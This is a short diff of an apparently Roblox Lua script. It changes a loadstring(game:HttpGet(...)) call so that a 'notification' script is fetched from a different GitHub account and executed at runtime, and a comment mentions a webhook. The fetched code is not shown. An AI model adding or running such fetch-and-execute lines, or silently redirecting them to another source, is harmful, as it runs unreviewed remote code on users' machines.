@@ -1,7 +1,7 @@
 -- dont spam webhook i lazy delete 
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IMNOTSNEAKER/SOHUBNEW/refs/heads/main/notification.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/elm3lem3omar2020-dot/ss/refs/heads/main/noti.lua"))()
 end)
 
 
